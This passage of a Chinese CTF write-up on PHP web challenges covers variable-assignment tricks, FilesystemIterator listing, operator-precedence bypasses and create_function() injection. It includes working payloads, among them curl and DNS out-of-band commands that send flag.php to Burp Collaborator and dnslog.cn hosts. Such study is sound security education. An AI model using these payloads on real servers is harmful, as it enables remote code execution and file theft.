CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])\n</code></pre>\n<p>因为上面的代码中的这个代码语句 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        a\n       \n       \n        =\n       \n      \n      \n       a=\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.43056em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span></span></span></span></span>_SERVER[‘argv’]; 会将url传入的变量存入数组a中，然后我们配合parse_str函数从数组a中取出fl0g=flag_give_me，配合eval函数，从而给fl0g变量赋值，这样就可以绕过if语句，从而echo出flag。</p>\n<blockquote>\n<p><code>$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']</code><br/> query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据</p>\n</blockquote>\n<p>这里进行了本地测试，注意需要在php.ini开启register_argc_argv配置项，测试代码为：</p>\n<pre><code>&lt;?php\n$a=$_SERVER['argv'];\nvar_dump($a);\n</code></pre>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\2f25bb5410e3d1ce8bf8a8055e54c8c3.png\"/></p>\n<p>所以如果我们get传入变量赋值语句，接着在post里面来执行这个赋值语句就可以完美绕过。</p>\n<h2><a id=\"_206\"></a>五、</h2>\n<p>考点一：利用php内置类FilesystemIterator 获取指定目录下的所有文件名。</p>\n<p>考点二：getcwd()函数的作用时返回当前工作目录。</p>\n<p><strong>例题：</strong></p>\n<pre><code>&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    if(preg_match('/~|`|!|@|#|\\$|%|^|&amp;|*|(|)|_|-|+|=|{|[|;|:|\"|'|,|.|?|\\\\|/|[0-9]/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/~|`|!|@|#|\\$|%|^|&amp;|*|(|)|_|-|+|=|{|[|;|:|\"|'|,|.|?|\\\\|/|[0-9]/', $v2)){\n            die(\"error v2\");\n    }\n\n    eval(\"echo new $v1($v2());\");\n}\n?&gt;\n</code></pre>\n<p><strong>例题分析：</strong></p>\n<p>这里正则进行了匹配，我们可以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的所有文件的文件名，payload为：</p>\n<pre><code>?v1=FilesystemIterator&amp;v2=getcwd\n</code></pre>\n<p>知道flag所在文件的文件名和目录后直接访问即可获得flag。</p>\n<h2><a id=\"_243\"></a>六、</h2>\n<p>考点一：PHP中逻辑运算符&amp;&amp;运算符比||运算符优先级高。</p>\n<p>考点二：PHP中逻辑运算符&amp;&amp;和||执行的流程。</p>\n<p><strong>例题：</strong></p>\n<pre><code>&lt;?php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['username']) &amp;&amp; isset($_GET['password']) &amp;&amp; isset($_GET['code'])){\n    $username = (String)$_GET['username'];\n    $password = (String)$_GET['password'];\n    $code = (String)$_GET['code'];\n    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===\"admin\"){\n\n        if($code == 'admin'){\n            echo $flag;\n        }\n    }\n}\n</code></pre>\n<p><strong>例题分析：</strong></p>\n<p>分析代码：由于&amp;&amp;运算符比||运算符优先级高，并且我们不知道随机数产生啥，所以$code === mt_rand(1,0x36D)的结果是false,同时我们看到code的值需要为admin，所以我们设置code=admin，又由于与运算（&amp;&amp;）一假则假，所以不再判断 $password === $flag 的部分，然后就变成了：</p>\n<pre><code>if(false|| $username ===\"admin\")\n</code></pre>\n<p>又由于或运算（||）一真则真，所以我们只要把username设置成admin即可，所以payload如下：</p>\n<pre><code>?username=admin&amp;code=admin&amp;password=1\n</code></pre>\n<p><strong>补充：</strong></p>\n<p><strong>一、PHP中逻辑运算符&amp;&amp;和||的分析：</strong></p>\n<p>首先，我给出一段代码：</p>\n<pre><code>&lt;?php\n    $test=\"李四\";\n    $test==\"张三\"&amp;&amp;$test=\"张三来了\";\n    echo $test;  //输出“李四”\n    $test=\"李四\";\n    $test==\"张三\"||$test=\"张三不在这里\";\n    echo $test;  //输出“张三不在这里”\n?&gt;\n</code></pre>\n<p>为什么会产生这样的结果呢？如果按照平常的方法，我们最少要用个IF语句来判断。可现在只是两个逻辑运算就会把变量的值给改变了。下面我们来分析一下它的运行原理。</p>\n<p>在参与逻辑运算的两边表达式中，是按照从左到右顺序进行运算的。而“与”运算中只要有一个是假，整个表达式的结果为假。所以，当左边表达式为假时，就无 需再进行运算了。这样的处理无疑对程序的运行效率是大有好处的。所以说正如题目所说，是一种高效的用法。而逻辑或就不同了：只要一个为真那整个表达式就为 真。所以，在左边为假的情况下，还要运行右边的表达式判断。明白或理解了上面所说，也就对结果不感到奇怪了。</p>\n<p>最后，我们做以下总结：<br/> 对于“与”（ <strong>&amp;&amp;</strong> ） 运算： <strong>x &amp;&amp; y</strong>当<strong>x</strong>为<strong>false</strong>时，直接跳过，不执行<strong>y</strong>；<br/> 对于“或”（ <strong>||</strong> ） 运算 ： <strong>x||y</strong>当<strong>x</strong>为<strong>true</strong>时，直接跳过，不执行<strong>y</strong>。</p>\n<p><strong>二、PHP运算符优先级一览表：</strong></p>\n<table><thead><tr><th><strong>优先级</strong></th><th><strong>结合方向</strong></th><th><strong>运算符</strong></th><th><strong>附加信息</strong></th></tr></thead><tbody><tr><td>1</td><td>无结合</td><td>clone、new</td><td>clone 和 new</td></tr><tr><td>2</td><td>从右向左</td><td>**</td><td>算术运算符</td></tr><tr><td>3</td><td>从右向左</td><td>++、–、~、(int)、(float)、(string)、(array)、(object)、(bool)、@</td><td>类型、递增／递减、错误控制</td></tr><tr><td>4</td><td>无结合</td><td>instanceof</td><td>类型</td></tr><tr><td>5</td><td>从右向左</td><td>!</td><td>逻辑运算符</td></tr><tr><td>6</td><td>从左向右</td><td>*、/、%</td><td>算术运算符</td></tr><tr><td>7</td><td>从左向右</td><td>+、-、.</td><td>算术运算符和字符串运算符</td></tr><tr><td>8</td><td>从左向右</td><td>&lt;&lt;、&gt;&gt;</td><td>位运算符</td></tr><tr><td>9</td><td>无结合</td><td>&lt;、&lt;=、&gt;、&gt;=</td><td>比较运算符</td></tr><tr><td>10</td><td>无结合</td><td><mark>、!=、</mark>=、!==、&lt;&gt;、&lt;=&gt;</td><td>比较运算符</td></tr><tr><td>11</td><td>从左向右</td><td>&amp;</td><td>位运算符和引用</td></tr><tr><td>12</td><td>从左向右</td><td>^</td><td>位运算符</td></tr><tr><td>13</td><td>从左向右</td><td></td><td></td></tr><tr><td>14</td><td>从左向右</td><td>&amp;&amp;</td><td>逻辑运算符</td></tr><tr><td>15</td><td>从左向右</td><td></td><td></td></tr><tr><td>16</td><td>从右向左</td><td>??</td><td>null 合并运算符</td></tr><tr><td>17</td><td>从左向右</td><td>? :</td><td>三元运算符</td></tr><tr><td>18</td><td>从右向左</td><td>=、+=、-=、*=、**=、/=、.=、%=、&amp;=、</td><td>=、^=、&lt;&lt;=、&gt;&gt;=</td></tr><tr><td>19</td><td>从左向右</td><td>and</td><td>逻辑运算符</td></tr><tr><td>20</td><td>从左向右</td><td>xor</td><td>逻辑运算符</td></tr><tr><td>21</td><td>从左向右</td><td>or</td><td>逻辑运算符</td></tr></tbody></table>\n<p>对具有相同优先级的运算符来说，从左向右的结合方向意味着将从左向右求值，从右向左结合方向则反之。对于无结合方向的则具有相同优先级的运算符，该运算符有可能无法与其自身结合。</p>\n<h2><a id=\"_335\"></a>七、</h2>\n<p>考点一：命令执行的骚操作：curl -F命令的使用。</p>\n<p>考点二：Burp Collaborator 的使用和带外攻击的概念与流程。</p>\n<p><strong>例题：</strong></p>\n<pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"6个字母都还不够呀?!\");\n    }\n}\n</code></pre>\n<p><strong>例题分析：</strong></p>\n<p>这个题主要是考察，命令执行的骚操作和curl -F的使用，分析一下代码发现仿佛是只能读取前面6个字符去执行命令，禁止了命令执行的函数，并且没有写入权限。那如果我们传递的参数就是<code>$F</code>本身，会不会发生变量覆盖？</p>\n<p>那我们来一个简单的测试。</p>\n<pre><code>我们传递?F=`$F`;+sleep 3   发现网站确实sleep了一会，说明的确执行了sleep命令\n**那为什么会这样？**\n因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数\n这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。\n而$F就是我们输入的`$F`;+sleep 3    所以最后执行的代码应该是\n``$F`;+sleep 3`,所以就可以成功执行sleep函数\n这里可能有点绕，可以慢慢理解下。\n</code></pre>\n<p>然后就是利用curl去带出flag.php</p>\n<pre><code># payload：\n#其中-F 为带文件的形式发送post请求\n#xx是上传文件的name值，flag.php就是上传的文件 \n# payload中的url地址是我们从Collaborator Client上获取到的，点击copy to clipboard即可获得\n\n?F=`$F`;+curl -X POST -F xx=@flag.php  http://qa42kvxuxk5mxr5twr0d84hgf7lx9m.burpcollaborator.net\n</code></pre>\n<p>我们在目标页面输入payload并发送后，然后点击Poll now即可看到Burp的 Collaborator服务器与目标服务器的通信数据包，从而我们可以看到flag。</p>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\5361729caa27486d2972284c22e37122.png\"/></p>\n<p>另外我们还可以利用dns带外来获取flag：</p>\n<pre><code>payload:\n\n?F = `$F`; curl `cat flag.php|grep \"flag\"`.hxmwnm.dnslog.cn\n</code></pre>\n<p><strong>补充:</strong></p>\n<p>**Burp Collaborator 的使用和带外攻击的概念与流程总。结:**https://blog.csdn.net/fageweiketang/article/details/89073662</p>\n<h2><a id=\"_400\"></a>八、</h2>\n<p>考点一：使用<code>create_function()</code>代码注入</p>\n<p>考点二：php里的默认命名空间相关知识</p>\n<p><strong>例题：</strong></p>\n<pre><code>&lt;?php\nhighlight_file(__FILE__);\n\nif(isset($_POST['ctf'])){\n    $ctfshow = $_POST['ctf'];\n    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {\n        $ctfshow('',$_GET['show']);\n    }\n}\n</code></pre>\n<p>这道题对ctf变量进行了一个正则表达式过滤，post传参的<code>ctf</code>和get传参的<code>show</code>进行了组合，这里我们可以使用<code>create_function()</code>进行代码注入</p>\n<blockquote>\n<p>string create_function ( string args , string args , string code )</p>\n<p>string $args 变量部分<br/> string $code 方法代码部分</p>\n</blockquote>\n<pre><code>#本地测试代码\ncreate_function('$test','echo $test.\"very cool\"')\n//等于\nfunction f($test){\n    echo $test.\"very cool\";\n} \n\n/*利用如下\n如果我们第二个参数输入的是'echo 111;}phpinfo();//'\n即可把前面的方法括号给闭合并且成功执行phpinfo命令，后面用//注释掉后边的语句\n也就是下面这个结构\n*/\nfunction f($dotast){\n    echo 111;\n}\nphpinfo();//}\n</code></pre>\n<p>而正则表达式我们可以用<code>进行绕过，正好</code>在php里代表默认命名空间。</p>\n<blockquote>\n<p>php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果是\\function_name()这样的形式去调用函数，则是表示写了一个绝对路径。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法</p>\n</blockquote>\n<p>最终payload为</p>\n<pre><code>?show=echo 123;}system(\"tac flag.php\");//\n\npost:\nctf=\\create_function\n</code></pre>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-02-16 15:32:00", "summary": "介绍本篇文章主要总结了我在写题目中遇到的关于的考点。因为只总结知识点和考点会比较空洞，也不容易理解，所以我都是通过题目来总结考点，这样的话比较容易理解。特性相关考点一、考点：正则表达式的匹配模式差异。"}